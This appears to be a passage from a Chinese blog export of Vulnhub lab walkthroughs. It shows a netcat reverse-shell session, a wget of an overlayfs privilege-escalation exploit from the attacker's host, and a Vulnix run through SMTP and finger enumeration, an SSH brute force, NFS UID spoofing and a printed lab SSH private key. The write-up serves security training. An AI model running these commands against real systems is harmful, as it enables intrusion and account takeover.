<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 48087</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>我首先列举了box的操作系统版本。那是一个Ubuntu 14.04.1 box。在Google的搜索中，我发现该机器容易受到overlayfs<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzcyOTI=">EDB-37292<i class="fa fa-external-link-alt"></i></span>攻击。我在kali上编译了它，然后将其转移到目标box中。运行漏洞利用程序时出现错误-sh：1：gcc：找不到。</p>
<p>目标框上没有gcc。如果我们检查exploit-db 37292漏洞利用代码，则在第143行上，您可以看到漏洞利用正在调用gcc。好吧，这很棘手。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub145.jpg"></p>
<p>我使用linuxprivchecker.py枚举了该框，以枚举已安装的开发工具。box里没有gcc，但是有cc。cc是原始UNIX c编译器命令的名称。对于cc和gcc的确切区别，我不是专家。我尝试在漏洞利用源代码中将gcc更改为cc并进行编译。生成的二进制文件为我root了box。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub146.jpg"></p>
<p>在kali中编译好exp后，直接wget下载到攻击机的shell中即可，然后赋予777权限，./exp执行，成功提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.56.102:8000/exp</span><br><span class="line">wget http://192.168.56.102:8000/exp</span><br><span class="line">--2020-01-10 06:24:47--  http://192.168.56.102:8000/exp</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17616 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 17,616      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-10 06:24:47 (331 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17616/17616]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">changelog.txt  config.php  editor_plugin.js      exp  includes</span><br><span class="line">classes        css         editor_plugin_src.js  img  rpc.php</span><br><span class="line">$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>找到flag，帅爆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">total 44</span><br><span class="line">drwx------  3 root root 4096 Apr 29  2018 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Apr 24  2018 ..</span><br><span class="line">-rw-r--r--  1 root root   19 May  3  2018 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Apr 28  2018 .cache</span><br><span class="line">-rw-------  1 root root  144 Apr 29  2018 .flag.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 19  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Apr 23  2018 .rnd</span><br><span class="line">-rw-------  1 root root 8296 Apr 29  2018 .viminfo</span><br><span class="line"><span class="comment"># cat .flag.txt</span></span><br><span class="line">cat .flag.txt</span><br><span class="line">Alec told me to place the codes here: </span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub147.jpg"></p>
<p>最后的flag是这个</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub148.jpg"></p>
<p>一张动图,蛮有意思的。</p>
<ul>
<li>知识点总结：</li>
</ul>
<p>1.telnet邮件泄露<br>2.图片隐写<br>3.moodle管理员账户远程代码执行<br>4.Ubuntu 14.04.1版本提权<br>5.exp overlayfs[EDB-37292] 编译cc执行</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HackLAB-Vulnix]</title>
    <url>/2020/04/15/HackLAB-Vulnix/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：HackLAB: Vulnix<br>发布日期：2012年9月10日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Vulnix.7z</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS93cC1jb250ZW50L3VwbG9hZHMvdnVsbml4L1Z1bG5peC43eg==">http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43eg==">https://download.vulnhub.com/hacklab/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43ei50b3JyZW50">https://download.vulnhub.com/hacklab/Vulnix.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>在这里，有一台易受攻击的Linux主机，它具有配置方面的缺陷，而不是有目的的易受攻击的软件版本（无论如何，在发布之时！）该主机基于Ubuntu Server 12.04，并于2012年9月上旬进行了全面修补。详细信息如下：</p>
<p>架构：x86<br>格式：VMware（vmx＆vmdk）从版本4开始兼容<br>内存：512MB<br>网络：NAT<br>提取大小：820MB<br>压缩（下载大小）：194MB – 7zip格式– 7zip可从此处获得<br>MD5 Vulnix哈希值7z：0bf19d11836f72d22f30bf52cd585757<br>从此处下载Vulnix-</p>
<p>目标;引导，查找IP，破解并获得隐藏在/root中的flag-通过任何想要的方式-不包括对vmdk的实际破解如果有任何问题/意见，请使用下面的评论部分免费联系。</p>
<p>请享用！</p>
<p>资料来源：<span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS8/cD05MzM=">http://www.rebootuser.com/?p=933<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.18</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:6C:D6:66 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.18</span></span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp       Postfix smtpd</span><br><span class="line">79/tcp    open  finger     Linux fingerd</span><br><span class="line">110/tcp   open  pop3?</span><br><span class="line">111/tcp   open  rpcbind    2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">143/tcp   open  imap       Dovecot imapd</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>       netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl    2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">39832/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">42471/tcp open  status     1 (RPC <span class="comment">#100024)</span></span><br><span class="line">45506/tcp open  nlockmgr   1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">52840/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">53613/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br></pre></td></tr></table></figure>

<p>如所见，对于某些用户枚举来说，有一些开放的端口可能很有趣：25（smtp），79（finger）和111（rpcbind）。开始做一些手动尝试来获取端口25（smtp）上的用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.66.18 25</span></span><br><span class="line">Trying 192.168.66.18...</span><br><span class="line">Connected to 192.168.66.18.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">ehlo server</span><br><span class="line">250-vulnix</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250 DSN</span><br><span class="line">vrfy root</span><br><span class="line">252 2.0.0 root</span><br><span class="line">vrfy admin</span><br><span class="line">550 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy user</span><br><span class="line">252 2.0.0 user</span><br><span class="line">vrfy administrator</span><br><span class="line">550 5.1.1 &lt;administrator&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy vulnix</span><br><span class="line">252 2.0.0 vulnix</span><br></pre></td></tr></table></figure>

<p>在系统上找到3个用户：root，user和vulnix。继续使用finger进行一些研究：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># finger @192.168.66.18</span></span><br><span class="line">No one logged on.</span><br><span class="line">root@kali:~<span class="comment"># finger root@192.168.66.18</span></span><br><span class="line">Login: root                             Name: root</span><br><span class="line">Directory: /root                        Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger user@192.168.66.18</span></span><br><span class="line">Login: user                             Name: user</span><br><span class="line">Directory: /home/user                   Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line"></span><br><span class="line">Login: dovenull                         Name: Dovecot login user</span><br><span class="line">Directory: /nonexistent                 Shell: /bin/<span class="literal">false</span></span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger vulnix@192.168.66.18</span></span><br><span class="line">Login: vulnix                           Name: </span><br><span class="line">Directory: /home/vulnix                 Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br></pre></td></tr></table></figure>

<p>有趣的是，该用户用户还具有用于Dovecot的虚拟用户，但没有登录。Dovecot是一个开源电子邮件服务器。这可能是有用的信息。</p>
<p>服务rpcbind已打开。这对于执行一些RPC枚举很有用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># rpcinfo -p 192.168.66.18</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    4   tcp    111  portmapper</span><br><span class="line">    100000    3   tcp    111  portmapper</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    4   udp    111  portmapper</span><br><span class="line">    100000    3   udp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  38458  status</span><br><span class="line">    100024    1   tcp  39760  status</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100227    2   tcp   2049</span><br><span class="line">    100227    3   tcp   2049</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100227    2   udp   2049</span><br><span class="line">    100227    3   udp   2049</span><br><span class="line">    100021    1   udp  47060  nlockmgr</span><br><span class="line">    100021    3   udp  47060  nlockmgr</span><br><span class="line">    100021    4   udp  47060  nlockmgr</span><br><span class="line">    100021    1   tcp  50245  nlockmgr</span><br><span class="line">    100021    3   tcp  50245  nlockmgr</span><br><span class="line">    100021    4   tcp  50245  nlockmgr</span><br><span class="line">    100005    1   udp  47351  mountd</span><br><span class="line">    100005    1   tcp  50825  mountd</span><br><span class="line">    100005    2   udp  42195  mountd</span><br><span class="line">    100005    2   tcp  55764  mountd</span><br><span class="line">    100005    3   udp  38349  mountd</span><br><span class="line">    100005    3   tcp  38329  mountd</span><br></pre></td></tr></table></figure>

<p>现在确定NFS正在侦听端口2049/tcp和2049/udp。现在是时候进行一些NFS枚举了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># showmount -e 192.168.66.18</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.66.18:</span><br><span class="line">/home/vulnix *</span><br></pre></td></tr></table></figure>

<p>这意味着可以从任何主机访问共享。因此将该共享的位置安装在本地计算机上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># mount 192.168.66.18:/home/vulnix /root/vulnhub/vulnix</span></span><br><span class="line">root@kali:~/vulnhub<span class="comment"># cd vulnix</span></span><br><span class="line">bash: <span class="built_in">cd</span>: vulnix: 权限不够</span><br></pre></td></tr></table></figure>

<p>但是当尝试访问该文件夹时，检索到拒绝访问。尝试更改访问权限，但检索到相同的错误。认为root squashing已启用，因为去过由该VM的创建者开办的培训课程，经常提到要使其保持启用状态。</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>至此，决定暴力破解已检索用户的密码。创建一个文件，收集所有用户（没有用户dovenull，没有登录访问权限）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># cat user.txt </span></span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">vulnix</span><br></pre></td></tr></table></figure>

<p>然后使用字典列表rockyou.txt破解密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># medusa -h 192.168.66.18 -U user.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh -t 64</span></span><br></pre></td></tr></table></figure>

<p>终于破解了用户user的密码，即letmein。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh user@192.168.66.18</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.18 (192.168.66.18)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.18<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">user@192.168.66.18&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 03:53:37 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           89</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB                                                                                                        </span><br><span class="line">                                                                                                                                      </span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">user@vulnix:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user),100(users)</span><br><span class="line">user@vulnix:~$ whoami</span><br><span class="line">user</span><br><span class="line">user@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/user</span><br><span class="line">user@vulnix:~$ uname -a</span><br><span class="line">Linux vulnix 3.2.0-29-generic-pae <span class="comment">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>当然，该用户不是sudoer。</p>
<h3 id="ssh-key毒化以getshell"><a href="#ssh-key毒化以getshell" class="headerlink" title="ssh key毒化以getshell"></a>ssh key毒化以getshell</h3><p>不得已时尝试以vulnix用户身份登录。</p>
<p>检查受害服务器上的/etc/passwd文件，发现用户vulnix具有UID 2008，因此在本地计算机上创建了一个名为vulnix的用户，UID为2008，然后尝试再次访问该分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@vulnix:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:104:110::/var/spool/postfix:/bin/<span class="literal">false</span></span><br><span class="line">dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/<span class="literal">false</span></span><br><span class="line">dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:107:113::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br><span class="line">vulnix:x:2008:2008::/home/vulnix:/bin/bash</span><br><span class="line">statd:x:109:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>使用新创建的vulnix用户（具有UID 2008权限）成功进入已经挂载的/mnt/vulnix文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># useradd vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># passwd vulnix</span></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">root@kali:~<span class="comment"># leafpad /etc/passwd</span></span><br><span class="line">root@kali:~<span class="comment"># su vulnix</span></span><br><span class="line">$ ls</span><br><span class="line">android-backup-recover.jar  ctf               go                  Linux_Exploit_Suggester.pl  proxychains-ng  TheFatRat</span><br><span class="line">ant                         Desktop           gobackdoor          linuxprivchecker.py         pwndbg          translatefiles</span><br><span class="line">antshells                   dirmap            gobackdoor.go       linux-sendpage3             pycdc           trojan</span><br><span class="line">antsword                    dirsearch         HiddenEye           location                    safedog2.py     uncompyle2</span><br><span class="line">BlindWaterMark              Downloads         historyvulnhub      Lucifer113.ovpn             safedog.py      vulnhub</span><br><span class="line">burpextend                  dvcs-ripper       hsdecomp            lxd-alpine-builder          shells          WAFNinja</span><br><span class="line">cansina                     Fatrat_Generated  knock-knock-master  picture                     SocialFish</span><br><span class="line">checkifbase64.py            GitHack           LinEnum.sh          pkcrack                     struts-pwn</span><br><span class="line">$ id</span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">$ <span class="built_in">cd</span> /mnt/vulnix</span><br><span class="line">$ ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix</span><br><span class="line">$ whoami</span><br><span class="line">vulnix</span><br><span class="line">$ id</span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ ls -la</span><br><span class="line">总用量 20</span><br><span class="line">drwxr-x--- 2 nobody 4294967294 4096 9月   2  2012 .</span><br><span class="line">drwxr-xr-x 3 root   root       4096 4月  15 23:00 ..</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294 3486 4月   3  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  675 4月   3  2012 .profile</span><br></pre></td></tr></table></figure>

<p>已经进入，生成一个SSH密钥，以vulnix用户身份登录而不需要密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh-keygen -t rsa</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa): /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:spDzqP71ppmCK9Ls2eSA+m1TFlI8Rs5xptB4isWBn7M root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">|   oo*o o        |</span></span><br><span class="line"><span class="string">|  . ++B=         |</span></span><br><span class="line"><span class="string">|   + *+.         |</span></span><br><span class="line"><span class="string">|  . *..          |</span></span><br><span class="line"><span class="string">|    ++..S        |</span></span><br><span class="line"><span class="string">| .  E=oo         |</span></span><br><span class="line"><span class="string">|.o..oo+          |</span></span><br><span class="line"><span class="string">|+ +O+. +.        |</span></span><br><span class="line"><span class="string">|o=B+=o+o.        |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub  user.txt</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span><br><span class="line"><span class="string">NhAAAAAwEAAQAAAYEA3rZnUKi375a1jnBNaY1apRRslsyf+YG8mMrGKcnEwDGEXcKaeyna</span></span><br><span class="line"><span class="string">zdXsBDPf/0V2kQA9XYPBG+Q/ppc6hl4BpmDi+SbEDH5KSX2SPyON1qeYAAu9kfwSx8HOxW</span></span><br><span class="line"><span class="string">SPUYePPCOnuqxcBA2iIISsmSq10QR7mMSiADqpGFjM0C/22NhLbdEX4WSsJPbOJVhJFLn9</span></span><br><span class="line"><span class="string">VCtVGpLC/g3Cu3CYJ5EtuAfvAYcwvgjJjW0Rb7Euv7nsBaTVfcFWkCfPzFgXGzdhnLORLP</span></span><br><span class="line"><span class="string">Ig29l0NrHkxTbh0cfNpcUrSRO8xSUUF8ACMxObbuVcjzbpXX8rrTaxemE89vFVG6zLRxEX</span></span><br><span class="line"><span class="string">0Fk21EHc/CMfYj7RrHYUek689KaKKGfS/X5dNQIwJ0kfR/zkz5L1WrkemrM+wJPamxeckL</span></span><br><span class="line"><span class="string">DEGVTdg1HmIOwVsFpKV/QiAQijPnCQfa1f2buQxOOSla2rD80bGYIPlJ2/ZdYR/GizM+6Q</span></span><br><span class="line"><span class="string">Er+XcCTzWYDsKT2NYO+ZVCROgxTR2CyLuY4Hb+M7AAAFgHbM1252zNduAAAAB3NzaC1yc2</span></span><br><span class="line"><span class="string">EAAAGBAN62Z1Cot++WtY5wTWmNWqUUbJbMn/mBvJjKxinJxMAxhF3Cmnsp2s3V7AQz3/9F</span></span><br><span class="line"><span class="string">dpEAPV2DwRvkP6aXOoZeAaZg4vkmxAx+Skl9kj8jjdanmAALvZH8EsfBzsVkj1GHjzwjp7</span></span><br><span class="line"><span class="string">qsXAQNoiCErJkqtdEEe5jEogA6qRhYzNAv9tjYS23RF+FkrCT2ziVYSRS5/VQrVRqSwv4N</span></span><br><span class="line"><span class="string">wrtwmCeRLbgH7wGHML4IyY1tEW+xLr+57AWk1X3BVpAnz8xYFxs3YZyzkSzyINvZdDax5M</span></span><br><span class="line"><span class="string">U24dHHzaXFK0kTvMUlFBfAAjMTm27lXI826V1/K602sXphPPbxVRusy0cRF9BZNtRB3Pwj</span></span><br><span class="line"><span class="string">H2I+0ax2FHpOvPSmiihn0v1+XTUCMCdJH0f85M+S9Vq5HpqzPsCT2psXnJCwxBlU3YNR5i</span></span><br><span class="line"><span class="string">DsFbBaSlf0IgEIoz5wkH2tX9m7kMTjkpWtqw/NGxmCD5Sdv2XWEfxoszPukBK/l3Ak81mA</span></span><br><span class="line"><span class="string">7Ck9jWDvmVQkToMU0dgsi7mOB2/jOwAAAAMBAAEAAAGAQTkYDrYqj/8KErnu4d+k0T2nA4</span></span><br><span class="line"><span class="string">7Ptul4yyJvYGOXvFWEF1VbmoBKdQeWRDDRA9ha/eIdFpr0Xe+9eFNHr3wubYRoVGE2/xWp</span></span><br><span class="line"><span class="string">OdaNkvIdouSYDkNh9DPnaBrpLEPj+RODLjCe+Xtqw0Ee3vkb9wtcDeeLLtU/QGPti5TN/p</span></span><br><span class="line"><span class="string">Zda2oExRd8L+UkyPqCqsstM+W4PAMovEyI0JBFHFHALa5FvmSMaV0nODAonsN3XMd+EmYn</span></span><br><span class="line"><span 